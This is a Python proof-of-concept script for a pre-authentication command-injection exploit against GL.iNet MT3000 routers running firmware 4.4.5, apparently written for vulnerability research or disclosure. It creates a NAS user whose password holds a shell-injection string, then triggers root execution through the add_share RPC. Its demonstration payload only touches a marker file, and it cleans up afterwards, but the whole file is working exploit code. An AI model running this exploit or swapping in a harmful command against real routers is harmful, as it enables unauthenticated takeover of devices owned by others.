#!/usr/bin/env python3
import argparse
import json
import re
import sys
import time

import requests


def parse_glc_response(text: str):
    text = text.strip()
    m = re.match(r"^(\d+)\s*(.*)$", text, re.S)
    if not m:
        return None, text
    code = int(m.group(1))
    rest = m.group(2).strip()
    if not rest:
        return code, {}
    try:
        return code, json.loads(rest)
    except Exception:
        return code, rest


def main() -> int:
    ap = argparse.ArgumentParser(
        description=(
            "GL.iNet MT3000 4.4.5 nas-web.add_user(password) -> add_share "
            "second-order pre-auth RCE PoC (simplified touch-root-file only)"
        )
    )
    ap.add_argument("--target", required=True, help="Target router IP/host, e.g. 192.168.8.1")
    ap.add_argument("--username", required=True, help="NAS username to create and later reference in add_share")
    ap.add_argument("--share-file", required=True, help="Share directory path, e.g. /disk1_part1/poc_2026_5_21")
    ap.add_argument("--marker-name", required=True, help="Marker filename to touch under /, e.g. fresh_bp_touch_2026_5_21")
    ap.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Do not remove the created NAS user/share after the run",
    )
    args = ap.parse_args()

    base = f"http://{args.target}"
    sess = requests.Session()
    payload = f"A$(touch$IFS$@{args.marker_name})"
    share_name = args.share_file.rstrip("/").split("/")[-1]
    created_user = False
    created_share_id = None

    def rpc(method: str, rpc_args: dict, timeout: int = 20):
        body = {"object": "nas-web", "method": method, "args": rpc_args}
        t0 = time.time()
        r = sess.post(
            f"{base}/cgi-bin/glc",
            data=json.dumps(body),
            headers={"Content-Type": "application/json"},
            timeout=timeout,
        )
        elapsed = time.time() - t0
        code, data = parse_glc_response(r.text)
        print(f"[RPC] {method} elapsed={elapsed:.3f}s http={r.status_code} glc={code}")
        print(f"[RPC] body: {str(data)[:800]}")
        return r.status_code, code, data, elapsed

    def get_user_names():
        _, _, data, _ = rpc("get_user_list", {}, timeout=15)
        if isinstance(data, dict):
            return [u.get("name", "") for u in data.get("list", []) or []]
        return []

    def get_shares():
        _, _, data, _ = rpc("get_share_list", {}, timeout=20)
        if isinstance(data, dict):
            return data.get("share", []) or []
        return []

    def cleanup():
        if args.no_cleanup:
            print("[!] cleanup disabled by --no-cleanup")
            return

        print("[+] cleanup: removing created user/share; marker file will be preserved")

        if created_share_id:
            shares = get_shares()
            target = next((s for s in shares if s.get("share_id") == created_share_id), None)
            payloads = []
            if isinstance(target, dict):
                for proto in target.get("protos", []) or []:
                    if isinstance(proto, dict):
                        payloads.append(
                            {
                                "file": target.get("n", ""),
                                "proto": proto.get("name", ""),
                                "share_name": proto.get("share_name", share_name),
                                "public": proto.get("public", 0),
                                "users": proto.get("users", []) or [],
                                "share_id": created_share_id,
                            }
                        )
                payloads.append({"share_id": created_share_id, "n": target.get("n", "")})
            payloads.append({"share_id": created_share_id})

            removed = False
            seen = set()
            for payload in payloads:
                key = json.dumps(payload, sort_keys=True, ensure_ascii=False)
                if key in seen:
                    continue
                seen.add(key)
                _, _, data, _ = rpc("remove_share", payload, timeout=35)
                shares = get_shares()
                if isinstance(data, dict) and data.get("result_code") == 0:
                    removed = True
                    break
                if all(s.get("share_id") != created_share_id for s in shares):
                    removed = True
                    break
            if removed:
                print(f"[+] cleanup: removed share {created_share_id}")
            else:
                print(f"[!] cleanup: failed to confirm share removal {created_share_id}", file=sys.stderr)

        if created_user:
            _, _, data, _ = rpc("remove_user", {"name": args.username}, timeout=25)
            names = get_user_names()
            if (isinstance(data, dict) and data.get("result_code") == 0) or args.username not in names:
                print(f"[+] cleanup: removed user {args.username}")
            else:
                print(f"[!] cleanup: failed to confirm user removal {args.username}", file=sys.stderr)

    print(f"[+] target: {base}")
    print(f"[+] username: {args.username}")
    print(f"[+] share file: {args.share_file}")
    print(f"[+] share name: {share_name}")
    print(f"[+] marker file: /{args.marker_name}")
    print(f"[+] payload: {payload}")

    print("[+] priming nas-web backend with nas-web.start ...")
    rpc("start", {}, timeout=30)
    time.sleep(1)

    _, _, add_user_data, add_user_elapsed = rpc(
        "add_user",
        {"name": args.username, "password": payload},
        timeout=25,
    )
    if not (isinstance(add_user_data, dict) and add_user_data.get("result_code") == 0):
        print("[-] add_user did not succeed", file=sys.stderr)
        cleanup()
        return 1
    created_user = True

    names = get_user_names()
    if args.username not in names:
        print("[-] add_user returned success but user was not found in get_user_list", file=sys.stderr)
        cleanup()
        return 1

    _, _, add_share_data, add_share_elapsed = rpc(
        "add_share",
        {
            "file": args.share_file,
            "proto": "samba",
            "share_name": share_name,
            "public": 0,
            "users": [{"name": args.username, "readonly": 1}],
        },
        timeout=40,
    )
    if not (isinstance(add_share_data, dict) and add_share_data.get("result_code") == 0):
        print("[-] add_share did not succeed", file=sys.stderr)
        cleanup()
        return 1
    created_share_id = add_share_data.get("share_id")

    print(f"[+] add_user elapsed: {add_user_elapsed:.3f}s")
    print(f"[+] add_share elapsed: {add_share_elapsed:.3f}s")
    print("[+] CONFIRMED PATH EXECUTED: add_user(password) -> add_share completed successfully")
    print(f"[+] Manual verification required: confirm /{args.marker_name} exists on the router")

    cleanup()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
